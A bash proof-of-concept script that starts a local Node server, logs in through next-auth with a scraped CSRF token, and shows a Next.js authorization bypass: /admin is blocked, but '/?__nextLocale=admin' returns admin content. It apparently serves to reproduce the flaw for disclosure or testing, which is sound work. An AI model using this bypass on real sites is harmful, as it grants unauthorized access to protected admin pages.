#!/bin/bash

COOKIE_FILE=cookie.txt

# Start server
echo "[*] Wait until server starts"
npm run start &
sleep 5

# Get CSRF Token
curl http://localhost:3000/api/auth/signin -c $COOKIE_FILE -s -o /dev/null

CSRF_TOKEN=$(cat $COOKIE_FILE | grep csrf | awk -F "next-auth.csrf-token" '{print $2}' | awk -F '%7C' '{print $1}' | awk '{$1=$1};1')

# Login
curl http://localhost:3000/api/auth/callback/credentials --data "csrfToken=$CSRF_TOKEN&username=&password=" -b $COOKIE_FILE -c $COOKIE_FILE -H 'Origin: http://localhost:3000/api/auth/signin' -s -o /dev/null

echo "[*] Login as jsmith"

# Get Admin Page
echo ""
echo "[*] Access to /admin is blocked:"
curl 'http://localhost:3000/admin' -b $COOKIE_FILE -s
echo ""

echo ""
echo "[*] /?__nextLocale=admin returns admin content:"

curl 'http://localhost:3000/?__nextLocale=admin' -b $COOKIE_FILE -s
